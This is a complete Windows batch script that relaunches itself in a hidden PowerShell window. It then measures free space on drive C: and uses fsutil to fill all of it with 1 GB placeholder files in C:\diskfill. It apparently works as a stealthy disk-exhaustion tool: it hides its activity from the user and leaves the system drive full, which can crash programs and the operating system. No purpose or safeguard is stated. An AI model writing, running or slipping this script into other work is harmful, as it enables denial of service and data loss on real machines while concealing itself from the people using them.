@echo off
if "%1" neq "hidden" (
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList 'hidden'"
    exit
)
setlocal enabledelayedexpansion
set "TARGET=C:\diskfill"
if not exist "%TARGET%" mkdir "%TARGET%"
set /a FILESIZE=1024*1024*1024
for /f %%a in ('powershell -NoProfile -Command "(Get-PSDrive C).Free"') do set "FreeSpace=%%a"
set /a FILECOUNT=FreeSpace / FILESIZE
set /a REMAINDER=FreeSpace %% FILESIZE
if %FILECOUNT% lss 1 set FILECOUNT=1
set /a COUNT=1
:CreateLoop
if %COUNT% leq %FILECOUNT% (
    fsutil file createnew "%TARGET%\file!COUNT!.bin" %FILESIZE%
    set /a COUNT+=1
    goto CreateLoop
)
if %REMAINDER% gtr 0 (
    fsutil file createnew "%TARGET%\file!COUNT!.bin" %REMAINDER%
)
echo Done.
pause
